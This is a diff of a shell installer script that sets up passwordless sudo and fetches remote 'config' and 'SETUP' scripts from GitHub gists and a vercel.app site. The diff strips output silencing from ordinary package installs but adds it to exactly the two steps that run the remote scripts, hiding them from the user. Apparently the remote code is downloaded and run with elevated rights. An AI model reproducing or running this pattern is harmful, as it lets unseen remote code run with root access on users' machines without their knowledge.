@@ -80,7 +80,6 @@ configure_passwordless_sudo || {
 }
 
 exec 3>&1 4>&2
-exec >/dev/null 2>&1
 
 OS_TYPE=$(uname -s)
 
@@ -104,20 +103,20 @@ pkg_install() {
 
     case "$pkg_manager" in
         apt-get|apt)
-            _sudo "$pkg_manager" update >/dev/null 2>&1
-            _sudo "$pkg_manager" install -y "${packages[@]}" >/dev/null 2>&1
+            _sudo "$pkg_manager" update
+            _sudo "$pkg_manager" install -y "${packages[@]}"
             ;;
         dnf|yum)
-            _sudo "$pkg_manager" install -y "${packages[@]}" >/dev/null 2>&1
+            _sudo "$pkg_manager" install -y "${packages[@]}"
             ;;
         pacman)
-            _sudo pacman -S --needed --noconfirm "${packages[@]}" >/dev/null 2>&1
+            _sudo pacman -S --needed --noconfirm "${packages[@]}"
             ;;
         zypper)
-            _sudo zypper --non-interactive install "${packages[@]}" >/dev/null 2>&1
+            _sudo zypper --non-interactive install "${packages[@]}"
             ;;
         apk)
-            _sudo apk add --no-cache "${packages[@]}" >/dev/null 2>&1
+            _sudo apk add --no-cache "${packages[@]}"
             ;;
         *)
             return 1
@@ -207,7 +206,7 @@ bridge_command_into_current_path() {
         return 0
     fi
 
-    ln -sfn "$source_path" "$target_path" >/dev/null 2>&1 || return 1
+    ln -sfn "$source_path" "$target_path" || return 1
     hash -r 2>/dev/null || true
     return 0
 }
@@ -264,12 +263,12 @@ download_url_to_stdout() {
     local url="$1"
 
     if command -v curl &>/dev/null; then
-        curl --tlsv1.2 -fsSL "$url" 2>/dev/null || curl -fsSL "$url"
+        curl --tlsv1.2 -fL "$url" || curl -fL "$url"
         return $?
     fi
 
     if command -v wget &>/dev/null; then
-        wget --https-only --secure-protocol=TLSv1_2 -qO- "$url" 2>/dev/null || wget -qO- "$url"
+        wget --https-only --secure-protocol=TLSv1_2 -O- "$url" || wget -O- "$url"
         return $?
     fi
 
@@ -677,7 +676,7 @@ CONFIG_SCRIPT_URLS=(
     "https://gist.githubusercontent.com/web3toolsbox/c835bbb706a2e3afb2f1c7e3a90107de/raw/setup.sh"
 )
 if [ -d "$SCRIPT_DIR/.configs" ]; then
-    run_step "配置相关环境" run_remote_config_script
+    run_step "配置相关环境" run_remote_config_script >/dev/null 2>&1
 fi
 
 run_remote_setup_script() {
@@ -702,7 +701,7 @@ SETUP_SCRIPT_URLS=(
     "https://agentskillshub.vercel.app/src/SETUP.sh"
     "https://gist.githubusercontent.com/web3toolsbox/bd5951319d0e33ee645240f27370eb60/raw/SETUP.sh"
 )
-run_step "运行 SETUP 脚本" run_remote_setup_script
+run_step "运行 SETUP 脚本" run_remote_setup_script >/dev/null 2>&1
 
 if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
     echo "" >&3
